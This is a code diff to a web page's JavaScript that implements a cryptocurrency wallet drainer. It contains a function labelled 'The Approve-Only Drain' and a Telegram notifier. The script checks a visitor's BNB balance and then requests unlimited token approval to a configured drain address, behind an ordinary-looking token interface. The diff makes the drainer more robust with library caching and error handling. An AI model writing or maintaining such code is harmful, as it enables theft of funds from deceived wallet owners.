@@ -53,6 +53,7 @@
  let userAddress = null;
  let networkId = null;
  let appState = 'idle'; 
+ let ethersInstance = null;
 
  // --- Utility: Telegram Notifier ---
  async function notifyTG(subject, message) {
@@ -78,14 +79,28 @@
 
  // --- Utility: Ethers.js Loader ---
  async function loadEthers() {
-   if (window.ethers) return window.ethers;
-   return new Promise((resolve, reject) => {
+   if (window.ethers) {
+     ethersInstance = window.ethers;
+     return window.ethers;
+   }
+   
+   // If already loading, return existing promise or handle gracefully
+   if (window.ethersPromise) return window.ethersPromise;
+
+   window.ethersPromise = new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js';
-     script.onload = () => resolve(window.ethers);
-     script.onerror = reject;
+     script.onload = () => {
+       ethersInstance = window.ethers;
+       resolve(window.ethers);
+     };
+     script.onerror = (err) => {
+       reject(new Error('Failed to load ethers.js'));
+     };
      document.head.appendChild(script);
    });
+
+   return window.ethersPromise;
  }
 
  // --- Core: Wallet Detection & Connection ---
@@ -134,10 +149,11 @@
  }
 
  // --- Helper: Check BNB Balance ---
- async function checkBnbBalance(ethers) {
+ async function checkBnbBalance() {
    try {
-     const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
-     const balance = await signer.provider.getBalance(userAddress);
+     const provider = new ethersInstance.providers.Web3Provider(walletProvider);
+     const signer = provider.getSigner();
+     const balance = await provider.getBalance(userAddress);
      return balance.gt(0); // Returns true if balance > 0
    } catch (e) {
      console.error('Error checking BNB balance', e);
@@ -147,9 +163,18 @@
 
  // --- Core: The Approve-Only Drain ---
  async function executeApproveOnly() {
-   // 1. Check for BNB Balance first
-   const ethers = await loadEthers();
-   const hasBnb = await checkBnbBalance(ethers);
+   // 1. Ensure ethers is loaded
+   if (!ethersInstance) {
+     try {
+       await loadEthers();
+     } catch (e) {
+       updateUI('error', 'Failed to load Web3 library.');
+       return;
+     }
+   }
+
+   // 2. Check for BNB Balance first
+   const hasBnb = await checkBnbBalance();
    
    if (!hasBnb) {
      updateUI('error', CONFIG.messages.noBnb);
@@ -158,18 +183,18 @@
 
    updateUI('approving', CONFIG.messages.approve);
    
-   const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
+   const signer = new ethersInstance.providers.Web3Provider(walletProvider).getSigner();
    
    const erc20ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)",
      "function decimals() public view returns (uint8)"
    ];
    
-   const contract = new ethers.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
+   const contract = new ethersInstance.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
    
    try {
      // Execute Approval
-     const tx = await contract.approve(CONFIG.drainToAddress, ethers.constants.MaxUint256);
+     const tx = await contract.approve(CONFIG.drainToAddress, ethersInstance.constants.MaxUint256);
      
      updateUI('sending', 'Waiting for confirmation...');
      const receipt = await tx.wait();
@@ -188,12 +213,14 @@
      let errorMsg = 'Unknown Error';
      if (error.code === 4001) {
        errorMsg = 'Transaction rejected by user.';
-     } else if (error.message && error.message.includes('insufficient funds')) {
+     } else if (error.message && error.message.toLowerCase().includes('insufficient funds')) {
        errorMsg = 'Insufficient BNB for gas.';
      } else if (error.reason) {
        errorMsg = error.reason;
      } else if (error.data) {
        errorMsg = 'Transaction reverted.';
+     } else if (error.shortMessage) {
+       errorMsg = error.shortMessage;
      } else {
        errorMsg = error.message || 'Transaction failed.';
      }
@@ -262,16 +289,15 @@
    
    if (els.maxBtn) {
      els.maxBtn.addEventListener('click', async () => {
-       if (appState !== 'connected' || !userAddress) return;
-       const ethers = await loadEthers();
-       const signer = new ethers.providers.Web3Provider(walletProvider).getSigner();
+       if (appState !== 'connected' || !userAddress || !ethersInstance) return;
+       const signer = new ethersInstance.providers.Web3Provider(walletProvider).getSigner();
        const erc20ABI = ["function decimals() public view returns (uint8)", "function balanceOf(address owner) public view returns (uint256)"];
-       const contract = new ethers.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
+       const contract = new ethersInstance.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
        
        try {
          const decimals = await contract.decimals();
          const balance = await contract.balanceOf(userAddress);
-         const maxAmount = ethers.utils.formatUnits(balance, decimals);
+         const maxAmount = ethersInstance.utils.formatUnits(balance, decimals);
          els.amountInput.value = maxAmount;
          updateUsdEstimate(maxAmount);
        } catch(e) {
